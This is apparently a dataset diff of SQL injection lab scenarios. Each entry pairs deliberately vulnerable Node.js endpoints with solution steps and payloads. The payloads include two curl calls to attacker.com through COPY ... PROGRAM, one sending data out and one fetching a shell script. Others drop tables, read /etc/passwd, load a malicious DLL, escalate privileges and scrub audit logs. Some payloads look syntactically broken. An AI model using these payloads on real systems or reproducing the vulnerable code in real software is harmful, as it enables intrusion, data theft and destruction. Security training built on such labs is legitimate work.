@@ -1,0 +1,1747 @@
+[
+  {
+    "Lab scenario": "Banking Portal SQL injection in ORDER BY Clause via UNION Attack",
+    "Lab Description": "The transaction sorting feature in a banking portal directly concatenates user input into ORDER BY clauses. The application leaks database errors through verbose logging. To solve: Extract account balances using UNION-based injection while bypassing column type restrictions.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept sorting request with Burp Suite",
+      "Determine column count using ORDER BY 4-- payloads",
+      "Bypass type checks with CAST(): ' UNION SELECT CAST(balance AS TEXT),2,3,4 FROM accounts--",
+      "Identify numeric columns through error analysis",
+      "Exfiltrate full transaction history using hex encoding"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "const express = require('express');\nconst pool = require('./db').pool;\n\napp.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`FULL QUERY: ${query}\\nERROR: ${err.stack}`); // Error leakage\n      res.status(500).send('Payment system error');\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
+    "payloads": [
+      "CASE WHEN (1=1) THEN amount ELSE date END--",
+      "' UNION SELECT CAST(balance AS TEXT),2,3 FROM accounts--",
+      "' AND 1=CAST((SELECT current_database()) AS INTEGER)--"
+    ]
+  },
+  {
+    "Lab scenario": "IoT Device Manager Boolean-Based Blind SQLi in HAVING Clause",
+    "Lab Description": "An IoT device management dashboard filters sensor data using vulnerable HAVING conditions. No direct output is shown, but HTTP 200/500 status codes indicate query truthiness. To solve: Determine admin API key through binary search of character space.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Use OWASP ZAP to fuzz HAVING parameter",
+      "Identify boolean trigger: ' HAVING 1=1 -- vs 1=0",
+      "Automate with sqlmap: sqlmap -u '...' --technique=B --level=5",
+      "Brute-force API key using substring binary search",
+      "Validate key through device control API endpoint"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/sensor-aggregate', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.query(query, (err, result) => {\n    if(err) return res.status(500).send();\n    res.status(200).json({count: result.rowCount});\n  });\n});",
+    "payloads": [
+      "1=1 AND (SELECT SUBSTR(apikey,1,1) FROM admins)='a'",
+      "EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='devices')",
+      "(SELECT LENGTH(apikey) FROM admins)=32 AND 1=1"
+    ]
+  },
+  {
+    "Lab scenario": "CMS User Search Time-Based Injection via GraphQL",
+    "Lab Description": "A headless CMS exposes GraphQL endpoint with vulnerable user search. Responses show identical success/failure states. To solve: Exfiltrate password hashes through conditional response delays using DNS over HTTP.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Capture GraphQL query with Postman",
+      "Identify injectable field using pg_sleep(5) payloads",
+      "Set up collaborator server for OOB exfiltration",
+      "Craft time-based payload with CASE statements",
+      "Correlate response times with character values"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "const resolvers = {\n  Query: {\n    users(_, { search }) {\n      return db.query(`SELECT * FROM users WHERE ${search}`);\n    }\n  }\n};",
+    "payloads": [
+      "1=1; SELECT CASE WHEN (SUBSTR(hash,1,1)='a') THEN pg_sleep(5) ELSE 0 END FROM passwords",
+      "1=1 AND (SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT hash)))"
+    ]
+  },
+  {
+    "Lab scenario": "REST API Gateway UNION Injection Through JSON Parameter",
+    "Lab Description": "An inventory management API processes JSON payloads without type validation. The /search endpoint concatenates JSON array values directly into SELECT. To solve: Dump user credentials through type juggling attacks.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Modify Content-Type to application/json in Postman",
+      "Identify JSON array injection point: {\"filters\":[\"1=1\"]}",
+      "Bypass WAF using Unicode escapes: \\u0027 UNION...",
+      "Extract schema via json_agg() function",
+      "Convert results to base64 for exfiltration"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  //...\n});",
+    "payloads": [
+      "1=1] UNION SELECT null,version(),null--",
+      "\" OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns--"
+    ]
+  },
+  {
+    "Lab scenario": "Payment Processor Error-Based Injection in GROUP BY",
+    "Lab Description": "A payment analytics dashboard leaks PostgreSQL errors through misconfigured grouping. To solve: Extract PCI-compliant credit card numbers using verbose error messages with CTE injections.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Trigger error with invalid GROUP BY clause",
+      "Extract version info from error message",
+      "Use CTE to stack queries: ; WITH ...",
+      "Cast sensitive data to incompatible types",
+      "Bypass PCI logging through error channels"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/reports', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT ${group} FROM payments GROUP BY ${group}`;\n  //...\n});",
+    "payloads": [
+      "(SELECT 1/0 FROM credit_cards LIMIT 1)",
+      "GROUP BY (CAST((SELECT pan FROM cards) AS INTEGER))"
+    ]
+  },
+  {
+    "Lab scenario": "Healthcare Portal Second-Order SQLi in User Registration",
+    "Lab Description": "Patient registration form stores unsanitized input later used in batch reports. To solve: Trigger delayed injection during nightly report generation using temp table pollution.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Register patient with time-based payload",
+      "Monitor scheduled tasks with Burp Collaborator",
+      "Create temp table with credential data",
+      "Set up trigger-based exfiltration",
+      "Harvest data from scheduled report outputs"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/register', (req, res) => {\n  const note = req.body.medical_notes;\n  db.query(`INSERT INTO patients (notes) VALUES ('${note}')`);\n});",
+    "payloads": [
+      "'); CREATE TEMP TABLE exfil AS SELECT * FROM staff--",
+      "'); COPY (SELECT * FROM diagnoses) TO PROGRAM 'curl https://attacker.com/?exfil=$(data)'--"
+    ]
+  },
+  {
+    "Lab scenario": "E-Commerce Platform JSON Array Injection in WHERE Clause",
+    "Lab Description": "Product search feature parses JSON arrays directly into SQL conditions. To solve: Bypass parameterized queries through JSON nesting and type confusion attacks.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Convert normal request to JSON array format",
+      "Escape array context using nested objects",
+      "Chain multiple injections with boolean logic",
+      "Bypass prepared statements via type juggling",
+      "Combine with XSS for stored exfiltration"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/products', (req, res) => {\n  const filters = JSON.parse(req.body);\n  const conditions = filters.map(f => `${f.field}=${f.value}`).join(' AND ');\n  const query = `SELECT * FROM products WHERE ${conditions}`;\n});",
+    "payloads": [
+      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT 1,version()--\"}]",
+      "[{\"field\":\"price\",\"value\":\"0 OR 1=1\"}]"
+    ]
+  },
+  {
+    "Lab scenario": "Inventory Management UNION Injection with Column Padding",
+    "Lab Description": "Legacy inventory system uses fixed column counts in UNION queries. To solve: Bypass column count validation through NULL padding and type coercion.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Determine base column count using ORDER BY",
+      "Bypass UNION restrictions with ALL SELECT",
+      "Use NULL and type casts to match columns",
+      "Extract system files using COPY TO",
+      "Decode base64 results in HTTP responses"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/items', (req, res) => {\n  const category = req.query.cat;\n  const query = `SELECT id, name FROM items WHERE category='${category}'`;\n});",
+    "payloads": [
+      "' UNION ALL SELECT CAST(id AS TEXT), password FROM users--",
+      "' UNION SELECT NULL, LOAD_EXTENSION('evil.dll')--"
+    ]
+  },
+  {
+    "Lab scenario": "CRM System Blind Injection via WebSocket Messages",
+    "Lab Description": "Real-time contact search uses WebSockets with no input validation. To solve: Perform blind boolean injection through response message ordering.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Intercept WebSocket handshake with Burp",
+      "Craft binary WebSocket frames with injection payloads",
+      "Measure response timing using sequence analysis",
+      "Use bit-shifting to optimize character extraction",
+      "Reconstruct session tokens through statistical analysis"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "ws.on('message', (query) => {\n  db.query(`SELECT * FROM contacts WHERE ${query}`, (err, res) => {\n    ws.send(JSON.stringify(res));\n  });\n});",
+    "payloads": [
+      "1=1; SELECT CASE WHEN (ASCII(SUBSTR(token,1,1))>100 THEN pg_sleep(2) END FROM sessions",
+      "1=1 AND (SELECT COUNT(*) FROM users WHERE permissions=0xdeadbeef)=1"
+    ]
+  },
+  {
+    "Lab scenario": "Learning Management System Polyglot Injection in CSV Export",
+    "Lab Description": "Grade export feature vulnerable to injection through CSV formula fields. To solve: Execute operating system commands through SQL injection with PostgreSQL large object imports.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Trigger CSV export with malicious formula",
+      "Bypass CSV escaping through UTF-7 encoding",
+      "Use PostgreSQL lo_import to read server files",
+      "Combine with COPY FROM PROGRAM for RCE",
+      "Clean attack artifacts through vacuum operations"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM grades WHERE ${filter}) TO STDOUT CSV`;\n});",
+    "payloads": [
+      "1=1); COPY grades FROM PROGRAM 'curl https://attacker.com/shell.sh'--",
+      "1=1 UNION SELECT LO_IMPORT('/etc/passwd')::text"
+    ]
+  },
+  {
+    "Lab scenario": "REST API Boolean-Based Blind SQLi in Login",
+    "Lab Description": "A REST API login endpoint uses dynamic SQL without sanitization. No error messages are returned, but a JWT token is issued on success. To solve: Perform boolean-based blind SQLi to extract the admin password character-by-character.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Use Postman to send POST /api/login requests",
+      "Test boolean conditions: admin' AND 1=1-- vs 1=0",
+      "Automate with sqlmap: sqlmap -r request.txt --technique=B --dbms=SQLite",
+      "Brute-force password using SUBSTR and binary search",
+      "Submit extracted password to obtain JWT token"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/api/login', (req, res) => {\n  const { user, pass } = req.body;\n  const query = `SELECT * FROM users WHERE username='${user}' AND password='${pass}'`;\n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 401).json(row ? { token: '...' } : {});\n  });\n});",
+    "payloads": [
+      "admin' AND SUBSTR(password,1,1)='a'--",
+      "admin' AND (SELECT LENGTH(password) FROM users)=32--",
+      "admin' AND (SELECT hex(password) LIKE '25%')--"
+    ]
+  },
+  {
+    "Lab scenario": "GraphQL Union-Based SQLi in IoT Device Query",
+    "Lab Description": "A GraphQL resolver for IoT devices concatenates user input into a SQL query. Results are returned as JSON. To solve: Use UNION injection to retrieve device API keys from the database.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Craft GraphQL query with malicious deviceId parameter",
+      "Inject: deviceId: \"123' UNION SELECT 1, api_key FROM devices--\"",
+      "Verify API keys appear in JSON response",
+      "Refine payload to extract specific credentials",
+      "Use extracted keys to access device controls"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "const resolvers = {\n  Query: {\n    device: (_, { id }) => {\n      const query = `SELECT id, status FROM devices WHERE id='${id}'`;\n      return db.get(query);\n    }\n  }\n};",
+    "payloads": [
+      "123' UNION SELECT id, api_key FROM devices--",
+      "456' UNION SELECT 1, sqlite_version()--",
+      "789' UNION SELECT NULL, group_concat(api_key) FROM devices--"
+    ]
+  },
+  {
+    "Lab scenario": "CMS Header-Based Blind SQLi with Boolean Inference",
+    "Lab Description": "A CMS logs HTTP headers into a SQL database. A log preview feature reflects entries matching boolean conditions. To solve: Extract admin email via boolean-based blind SQLi in the X-Search-Token header.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Intercept request with Burp Suite and modify X-Search-Token",
+      "Test: 'xyz' AND (SELECT 1 FROM users WHERE role='admin')=1--",
+      "Check log preview for presence/absence of entry",
+      "Automate with Python to infer email characters",
+      "Extract full email via SUBSTR and binary search"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/search', (req, res) => {\n  const token = req.headers['x-search-token'];\n  db.run(`INSERT INTO logs (entry) VALUES ('${token}')`);\n  res.send('Search logged');\n});",
+    "payloads": [
+      "test' AND (SELECT LENGTH(email) FROM users WHERE role='admin')=20--",
+      "test' AND (SELECT hex(substr(email,1,1)) FROM users)='61'--",
+      "test' AND (SELECT COUNT(*) FROM sqlite_master)=5--"
+    ]
+  },
+  {
+    "Lab scenario": "SOAP API Time-Based SQLi with XML Input",
+    "Lab Description": "A SOAP login service uses XML input in dynamic SQL. Responses lack feedback, but delays indicate query truthiness. To solve: Extract admin password via time-based delays.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Send XML payloads with time-delay conditions",
+      "Use payload: ' OR CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(100000000) ELSE 0 END--",
+      "Measure response times with Burp Suite's Repeater",
+      "Automate extraction with Python requests and timing",
+      "Reconstruct password from observed delays"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/soap/login', (req, res) => {\n  const xml = req.rawBody;\n  const user = extractXPath(xml, '//username');\n  const query = `SELECT * FROM users WHERE username='${user}'`;\n  db.get(query, (err, row) => {\n    res.send(`<success>${!!row}</success>`);\n  });\n});",
+    "payloads": [
+      "' OR CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(100000000) END--",
+      "' OR CASE WHEN (LENGTH(password)=32) THEN randomblob(100000000) END--"
+    ]
+  },
+  {
+    "Lab scenario": "E-Commerce GROUP BY SQLi with UNION Payloads",
+    "Lab Description": "A product grouping feature uses unsanitized input in GROUP BY. The application returns grouped results as JSON. To solve: Extract database schema via UNION-based injection.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept /products?group=category request",
+      "Determine column count with ORDER BY",
+      "Inject: group=category UNION SELECT sql,NULL FROM sqlite_master--",
+      "Parse schema details from JSON response",
+      "Extract table structures for users and orders"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/products', (req, res) => {\n  const group = req.query.group || 'category';\n  const query = `SELECT ${group}, COUNT(*) FROM products GROUP BY ${group}`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
+    "payloads": [
+      "category UNION SELECT tbl_name, sql FROM sqlite_master--",
+      "price UNION SELECT NULL, group_concat(tbl_name) FROM sqlite_master--"
+    ]
+  },
+  {
+    "Lab scenario": "Newsletter Signup Error-Based SQLi with URL Encoding",
+    "Lab Description": "A newsletter endpoint uses URL parameters directly in SQL. Verbose errors leak database information. To solve: Extract subscriber emails via UNION-based error injection.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Send GET /subscribe?email=test%40test.com",
+      "Trigger error: 'test%27 AND 1=CAST(version() AS INTEGER)--",
+      "Extract DB version from error message",
+      "Inject UNION SELECT to dump emails",
+      "Parse emails from HTML response"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/subscribe', (req, res) => {\n  const email = req.query.email;\n  db.run(`INSERT INTO subscribers(email) VALUES('${email}')`, (err) => {\n    if (err) res.status(500).send(`Error: ${err.message}`);\n    else res.send('Subscribed!');\n  });\n});",
+    "payloads": [
+      "test%40test.com' UNION SELECT email FROM subscribers--",
+      "test' AND 1=CAST((SELECT group_concat(email) FROM subscribers) AS INTEGER)--"
+    ]
+  },
+  {
+    "Lab scenario": "SQLite Stacked Queries in Login Form",
+    "Lab Description": "A login form allows stacked queries in SQLite. To solve: Update the admin password and authenticate.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit username: admin'; UPDATE users SET password='pwned' WHERE username='admin'--",
+      "Log in with username: admin and password: pwned",
+      "Verify access to admin dashboard"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/login', (req, res) => {\n  const { user, pass } = req.body;\n  db.get(`SELECT * FROM users WHERE username='${user}' AND password='${pass}'`, (err, row) => {\n    res.send(row ? 'Success' : 'Failed');\n  });\n});",
+    "payloads": [
+      "admin'; INSERT INTO users(username, password) VALUES ('attacker', 'pwned')--",
+      "admin'; DROP TABLE users--"
+    ]
+  },
+  {
+    "Lab scenario": "AJAX Autocomplete UNION SQLi in LIKE Clause",
+    "Lab Description": "An autocomplete endpoint uses unsanitized input in a LIKE clause. To solve: Extract user emails via UNION injection.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Send GET /autocomplete?q=a%25",
+      "Inject: %' UNION SELECT email FROM users--",
+      "Observe emails in JSON response",
+      "Refine payload to extract all records"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/autocomplete', (req, res) => {\n  const term = req.query.q || '';\n  db.all(`SELECT name FROM products WHERE name LIKE '%${term}%'`, (err, rows) => {\n    res.json(rows);\n  });\n});",
+    "payloads": [
+      "%' UNION SELECT email FROM users--",
+      "%' UNION SELECT password FROM users WHERE username='admin'--"
+    ]
+  },
+  {
+    "Lab scenario": "Blog Comment Form INSERT-Based SQLi with Error Extraction",
+    "Lab Description": "The blog comment system directly interpolates user input into an INSERT statement. While UNION injection isn't possible, error messages leak schema information. To solve: Extract table names via error-based SQLi.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Submit comment with author: '||(SELECT 1/0 FROM sqlite_master)--",
+      "Analyze error message for database schema details",
+      "Iterate payloads to reveal table structures",
+      "Extract credentials using CAST-based errors"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/comment', (req, res) => {\n  const { author, comment } = req.body;\n  const query = `INSERT INTO comments (author, comment) VALUES ('${author}', '${comment}')`;\n  db.run(query);\n  res.redirect('/blog');\n});",
+    "payloads": [
+      "'||(SELECT load_extension('invalid'))--",
+      "'||(SELECT 1 FROM sqlite_master WHERE tbl_name='users' AND 1=CAST(randomblob(1000000000) AS INTEGER))--"
+    ]
+  },
+  {
+    "Lab scenario": "Cookie-Based Authentication Bypass with Tautology",
+    "Lab Description": "Session validation uses cookies in a WHERE clause without sanitization. To solve: Bypass authentication using boolean logic and access admin profile.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept request and modify session cookie to: admin' OR '1'='1'--",
+      "Bypass authentication through tautological WHERE clause",
+      "Access privileged endpoints with valid session"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/profile', (req, res) => {\n  const session = req.cookies.session_id;\n  const query = `SELECT * FROM sessions WHERE session_id='${session}'`;\n  db.get(query, [], (err, user) => {\n    res.render('profile', { user });\n  });\n});",
+    "payloads": [
+      "admin' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
+      "xyz' UNION SELECT 1,'admin','admin'--"
+    ]
+  },
+  {
+    "Lab scenario": "API Key Validation UNION SQLi with Column Matching",
+    "Lab Description": "API key validation vulnerable to UNION injection. To solve: Determine column count and extract user credentials through careful UNION payload construction.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Determine column count using ORDER BY",
+      "Identify string-compatible columns with NULL placeholders",
+      "Inject: ' UNION SELECT username,password,NULL FROM users--",
+      "Parse credentials from API response"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/api/data', (req, res) => {\n  const key = req.query.key;\n  const query = `SELECT id, key, created_at FROM api_keys WHERE key='${key}'`;\n  db.get(query, [], (err, result) => {\n    if (result) res.json({ data: \"secure data\" });\n    else res.status(403).send(\"Invalid key\");\n  });\n});",
+    "payloads": [
+      "' UNION SELECT NULL,NULL,NULL--",
+      "' UNION SELECT username,password,NULL FROM users--"
+    ]
+  },
+  {
+    "Lab scenario": "Second-Order SQLi in Analytics Report Generation",
+    "Lab Description": "Bio field stored without sanitization and later used in admin reports. To solve: Poison bio field with SQL that executes during report generation.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Update bio to: ', (SELECT group_concat(email) FROM users))--",
+      "Trigger admin report generation",
+      "Extract emails from corrupted report output"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/admin/report', (req, res) => {\n  db.all(`SELECT id, bio FROM users`, [], (err, rows) => {\n    res.send(rows.map(r => `${r.id}: ${r.bio}`).join('<br>'));\n  });\n});",
+    "payloads": [
+      "', (SELECT sql FROM sqlite_master))--",
+      "', (SELECT hex(password) FROM users WHERE id=1))--"
+    ]
+  },
+  {
+    "Lab scenario": "Dynamic Table Name SQLi with System Table Access",
+    "Lab Description": "Table parameter vulnerable to schema enumeration. To solve: Extract database structure through controlled UNION attacks.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Determine base table column count",
+      "Inject: (SELECT name FROM sqlite_master LIMIT 1) UNION SELECT name,sql FROM sqlite_master--",
+      "Analyze response for schema details",
+      "Extract credentials from discovered tables"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/admin', (req, res) => {\n  const table = req.query.table;\n  const query = `SELECT name, type FROM ${table}`;\n  db.all(query, [], (err, rows) => {\n    res.json(rows);\n  });\n});",
+    "payloads": [
+      "(SELECT name FROM sqlite_master) UNION SELECT tbl_name,sql FROM sqlite_master--",
+      "users UNION SELECT name,password FROM users--"
+    ]
+  },
+  {
+    "Lab scenario": "JSON Body SQLi with Content-Type Bypass",
+    "Lab Description": "API endpoint vulnerable through JSON parameter injection. To solve: Bypass Content-Type validation and extract sensitive data.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Set Content-Type: application/json",
+      "Send payload: {\"username\": \"admin' UNION SELECT NULL,password,NULL FROM users--\"}",
+      "Handle JSON parsing errors through response analysis",
+      "Extract hashed passwords from nested responses"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/api/user-info', (req, res) => {\n  const username = req.body.username;\n  const query = `SELECT id, username, role FROM users WHERE username='${username}'`;\n  db.get(query, [], (err, user) => {\n    res.json(user);\n  });\n});",
+    "payloads": [
+      "admin' UNION SELECT 1,password,1 FROM users--",
+      "admin' AND 1=CAST((SELECT COUNT(*) FROM users) AS INTEGER)--"
+    ]
+  },
+  {
+    "Lab scenario": "Error-Based Password Recovery SQLi",
+    "Lab Description": "Password recovery form leaks schema through verbose errors. To solve: Extract table structure via type conversion errors.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Submit email: ' AND (SELECT 1 FROM sqlite_master WHERE tbl_name='users')=1--",
+      "Analyze error message for schema validation",
+      "Brute-force column names using incremental CAST operations"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/forgot-password', (req, res) => {\n  const email = req.body.email;\n  const query = `SELECT * FROM users WHERE email='${email}'`;\n  db.get(query, [], (err, user) => {\n    if (err) res.status(500).send(`Error: ${err.message}`);\n    else res.send(user ? \"Email sent\" : \"Invalid email\");\n  });\n});",
+    "payloads": [
+      "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--",
+      "' AND (SELECT LENGTH(password) FROM users WHERE email='admin@example.com')=60--"
+    ]
+  },
+  {
+    "Lab scenario": "Verification Token SQLi with Stacked Queries",
+    "Lab Description": "Verification endpoint vulnerable to stacked queries in PostgreSQL. To solve: Escalate privileges through batched SQL commands.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Craft token parameter: '; UPDATE users SET role='admin' WHERE email='user@example.com';--",
+      "Trigger verification endpoint",
+      "Confirm privilege escalation through admin panel access"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/verify', (req, res) => {\n  const token = req.query.token;\n  const query = `UPDATE users SET verified=true WHERE token='${token}'`;\n  db.run(query);\n  res.send(\"Verified\");\n});",
+    "payloads": [
+      "'; INSERT INTO users(email, role) VALUES ('attacker@test.com','admin');--",
+      "'; DROP TABLE audit_logs;--"
+    ]
+  },
+  {
+    "Lab scenario": "Pagination SQLi with OFFSET Clause Manipulation",
+    "Lab Description": "Pagination logic vulnerable through OFFSET parameter. To solve: Inject UNION payload into numeric parameter to extract database version.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Bypass numeric validation using scientific notation: 0e0 UNION SELECT sqlite_version()--",
+      "Handle type conversion errors through nested queries",
+      "Extract DB version from JSON response"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/products', (req, res) => {\n  const page = Number(req.query.page);\n  const size = Number(req.query.size);\n  const query = `SELECT * FROM products LIMIT ${size} OFFSET ${page * size}`;\n  db.all(query, [], (err, rows) => {\n    res.json(rows);\n  });\n});",
+    "payloads": [
+      "0 UNION SELECT 1,2,sqlite_version(),4--",
+      "0 AND 1=CAST((SELECT name FROM sqlite_master) AS INTEGER)--"
+    ]
+  },
+  {
+    "Lab scenario": "E-Commerce Portal UNION-Based SQLi in ORDER BY Clause",
+    "Lab Description": "Product sorting feature in Node.js application directly concatenates user input into ORDER BY clause. The application returns full query errors. To solve: Extract user credentials through UNION attack requiring column type matching.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Intercept /products?sort= request with Burp Suite",
+      "Determine column count: ' ORDER BY 5--",
+      "Identify string columns: ' UNION SELECT 'a','b','c','d','e'--",
+      "Extract credentials: ' UNION SELECT username,password,NULL,NULL,NULL FROM users--",
+      "Verify via login API endpoint"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "const express = require('express');\nconst db = require('./database');\n\napp.get('/products', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id,name,price FROM products ORDER BY ${sort}`;\n  \n  db.query(query, (err, result) => {\n    if(err) {\n      console.error('Full query:', query, '\\nError:', err); // Error leakage\n      res.status(500).send('Error: ' + err.message);\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
+    "payloads": [
+      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "' UNION SELECT username,password,1,1,1 FROM users--",
+      "' ORDER BY (SELECT 1 FROM users WHERE username='admin')--"
+    ]
+  },
+  {
+    "Lab scenario": "Healthcare API Boolean-Based Blind SQLi in WHERE Clause",
+    "Lab Description": "Patient lookup API returns HTTP 200/404 status codes based on query results. No error messages. To solve: Determine sensitive patient SSN through binary search character extraction.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Capture POST /api/patient-lookup with OWASP ZAP",
+      "Identify boolean condition: ' OR 1=1 AND 'a'='a",
+      "Automate with sqlmap: sqlmap -r request.txt --technique=B --dbms=PostgreSQL",
+      "Brute-force SSN using substring comparisons",
+      "Validate through insurance claim endpoint"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/api/patient-lookup', (req, res) => {\n  const patientId = req.body.id;\n  const query = `SELECT * FROM patients WHERE id='${patientId}' AND is_active=true`;\n  \n  db.query(query, (err, result) => {\n    if(result.rows.length > 0) {\n      res.status(200).send({found: true});\n    } else {\n      res.status(404).send({found: false});\n    }\n  });\n});",
+    "payloads": [
+      "' OR (SELECT SUBSTRING(ssn,1,1) FROM patients LIMIT 1)='5'--",
+      "' AND (SELECT LENGTH(ssn) FROM patients WHERE id=1)=9--"
+    ]
+  },
+  {
+    "Lab scenario": "IoT Device Manager Time-Based SQLi in GROUP BY Clause",
+    "Lab Description": "Device analytics dashboard vulnerable to blind injection through GROUP BY parameter. Responses identical but delay observable. To solve: Exfiltrate API keys through conditional response delays.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Intercept /analytics request with Burp Suite",
+      "Identify injectable parameter: group=day",
+      "Confirm time delay: '; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--",
+      "Brute-force API key character by character",
+      "Use extracted key in device control API"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/analytics', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM devices GROUP BY ${group}`;\n  \n  db.query(query, (err, result) => {\n    // No error returned\n    res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "; SELECT CASE WHEN (ASCII(SUBSTR(api_key,1,1))>100 THEN pg_sleep(5) ELSE NULL END FROM devices--",
+      " UNION SELECT NULL,(SELECT pg_sleep(5) FROM api_keys)--"
+    ]
+  },
+  {
+    "Lab scenario": "CMS Platform Error-Based SQLi in HAVING Clause",
+    "Lab Description": "Content analytics page leaks PostgreSQL errors through misconfigured HAVING clause. To solve: Extract admin credentials through verbose error messages.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "Intercept /analytics request with Burp Suite",
+      "Trigger error: ' HAVING 1=CAST((SELECT version()) AS INT)--",
+      "Extract table names from error messages",
+      "Retrieve credentials using CTE expressions",
+      "Bypass WAF using URL encoding"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/analytics', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT category, COUNT(*) FROM posts GROUP BY category HAVING ${filter}`;\n  \n  db.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString()); // Error leakage\n    else res.json(result.rows);\n  });\n});",
+    "payloads": [
+      "1=CAST((SELECT current_database()) AS INTEGER)--",
+      "1=1 AND (SELECT 1 FROM users WHERE username='admin')=1--"
+    ]
+  },
+  {
+    "Lab scenario": "Banking Portal Second-Order SQLi in User Registration",
+    "Lab Description": "User registration stores unsanitized input used in batch reports. To solve: Trigger scheduled report generation to exfiltrate account balances.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Register user with malicious comment: ' || (SELECT balance FROM accounts))--",
+      "Wait for nightly report generation",
+      "Monitor system logs for SQL errors",
+      "Extract data through error-based injection",
+      "Clean audit logs using stacked queries"
+    ],
